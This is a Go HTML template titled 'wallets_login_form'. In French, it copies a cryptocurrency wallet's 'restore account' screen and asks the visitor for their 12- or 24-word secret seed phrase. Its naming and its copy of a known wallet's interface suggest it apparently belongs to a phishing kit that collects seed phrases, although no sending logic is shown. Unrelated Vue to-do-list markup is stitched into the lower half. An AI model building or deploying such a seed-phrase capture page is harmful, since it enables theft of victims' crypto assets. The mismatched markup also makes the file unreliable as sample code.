{{ define "wallets_login_form" }}<!DOCTYPE html><html lang="en">
  {{ template "head" .PageTitle }}
  <body>
  <div id="app-content" class="dark">
    <div class="app mouse-user-styles">
      <div class="main-container-wrapper">
        <div class="first-time-flow">
          <div class="first-time-flow__wrapper">
            <div class="import-account" id="v-model-textarea">
              <a class="import-account__back-button" href="/">&lt; Back</a>
              <div class="import-account__title">Restaurer votre compte avec une phrase Seed.</div>
              <div class="import-account__selector-label">Saisissez votre phrase secrète de 12 ou 24 mots pour restaurer votre coffre-fort.</div>

                <div id="form-login" class="import-account__input-wrapper" >

                  <label class="import-account__input-label">Wallet Seed</label>

                  <textarea class="import-account__secret-phrase"

                            placeholder="Séparez chaque mot avec un espace"></textarea>

                  <p id="errors" v-for="error in errors">${errors}</p>
                  <div v-html="compiledMarkdown"></div>

                  <button class="button btn--first-time first-time-flow__button" id="btn-restaurer" >Restaurer</button>

                </div>

            <div class="todoapp">
              <input class="new-todo" autofocus autocomplete="off" placeholder="What needs to be done?" v-model="newTodo" @keyup.enter="addTodo" />
              <input id="toggle-all" class="toggle-all" type="checkbox"  v-model="allDone" />
              <label for="toggle-all"></label>
                <ul class="todo-list">
                  <li v-for="todo in filteredTodos" class="todo"  :key="todo.id" :class="{ completed: todo.completed, editing: todo == editedTodo }">
                    <div class="view">
                      <input class="toggle" type="checkbox" v-model="todo.completed" />
                      <label @dblclick="editTodo(todo)">${ todo.title }</label>
                      <button class="destroy" @click="removeTodo(todo)"></button>
                    </div>
                    <input class="edit"  type="text" v-model="todo.title" v-todo-focus="todo == editedTodo" @blur="doneEdit(todo)" @keyup.enter="doneEdit(todo)" @keyup.esc="cancelEdit(todo)" />
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    {{ template "footer" }}
  </div>
</body>
</html>{{ end }}